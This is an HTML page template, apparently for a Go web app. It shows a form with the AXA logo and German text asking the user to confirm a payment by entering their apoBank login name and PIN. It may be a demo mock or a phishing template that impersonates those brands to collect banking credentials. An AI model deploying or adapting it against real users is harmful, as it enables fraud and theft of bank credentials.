<html>
<head>
    <title>{{.PageTitle}}</title>

    <style>

            /* Bordered form */
            form {
                border: 3px solid #f1f1f1;
            }
            
            /* Full-width inputs */
            input[type=text], input[type=password] {
                width: 100%;
                padding: 12px 20px;
                margin: 8px 0;
                display: inline-block;
                border: 1px solid #ccc;
                box-sizing: border-box;
            }
            
            /* Set a style for all buttons */
            button {
                background-color: #4CAF50;
                color: white;
                padding: 14px 20px;
                margin: 8px 0;
                border: none;
                cursor: pointer;
                width: 100%;
            }
            
            /* Add a hover effect for buttons */
            button:hover {
                opacity: 0.8;
            }
            
            /* Extra style for the cancel button (red) */
            .cancelbtn {
                width: auto;
                padding: 10px 18px;
                background-color: #f44336;
            }
            
            /* Center the avatar image inside this container */
            .imgcontainer {
                text-align: center;
                margin: 24px 0 12px 0;
            }
            
            /* Avatar image */
            img.avatar {
                width: 10%;
                border-radius: 10%;
            }
            
            /* Add padding to containers */
            .container {
                padding: 16px;
            }
            
            /* The "Forgot password" text */
            span.psw {
                float: right;
                padding-top: 16px;
            }
            
            /* Change styles for span and cancel button on extra small screens */
            @media screen and (max-width: 300px) {
                span.psw {
                    display: block;
                    float: none;
                }
                .cancelbtn {
                    width: 100%;
                }
            }
            </style>
</head>
<body>
<h1>{{.PageTitle}}</h1>
<form>
        <div class="imgcontainer">
                <img src="https://cdn.freebiesupply.com/logos/large/2x/axa-768-logo-png-transparent.png" alt="AXA" class="avatar">
        </div>
        <div class="container">
                <h3><b>Bitte bestätigen Sie Ihre Zahlung mit ihrem Bank Account!</b></h3>
                <h4><b>Sie haben Ihr Konto bei der apoBank für die Zahlung ausgewählt.</b></h4>
                
                <label for="uname"><b>Bank ID</b></label>
                <input type="text" placeholder="Anmeldename Ihrer Bank" name="uname" required>
            
                <label for="psw"><b>PIN</b></label>
                <input type="password" placeholder="PIN Ihrer Bank" name="psw" required>
            
                <button type="submit">Login</button>
                <label>
                  <input type="checkbox" checked="checked" name="remember"> Remember me
                </label>
              </div>
</form>
</body>
</html>
